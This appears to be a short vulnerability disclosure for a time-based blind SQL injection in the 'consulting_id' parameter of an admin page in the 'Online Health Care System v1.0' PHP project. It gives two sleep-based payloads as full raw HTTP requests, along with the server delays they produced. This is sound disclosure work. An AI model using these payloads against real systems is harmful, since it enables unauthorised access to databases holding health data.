# Online Health Care System v1.0 by janobe has SQL injection

BUG_Author: Peisen Wang

vendors:https://www.sourcecodester.com/php/14526/online-health-care-system-php-full-source-code-2020.html

Vulnerability File: /healthcare/Admin/consulting_detail.php

Parameter "consulting_id" (GET), exists delayed injection vulnerability

Payload1: /healthcare/Admin/consulting_detail.php?consulting_id=(select*from(select(sleep(10)))a)

```
GET /healthcare/Admin/consulting_detail.php?consulting_id=(select*from(select(sleep(10)))a) HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

select(sleep(10)), The server response time is 10 seconds

![image](https://github.com/dreamwonly/pic/blob/main/ten.png)

Payload2: /healthcare/Admin/consulting_detail.php?consulting_id=(select*from(select(sleep(20)))a)

```
GET /healthcare/Admin/consulting_detail.php?consulting_id=(select*from(select(sleep(20)))a) HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

select(sleep(20)), The server response time is 20 seconds

![image](https://github.com/dreamwonly/pic/blob/main/twenty.png)

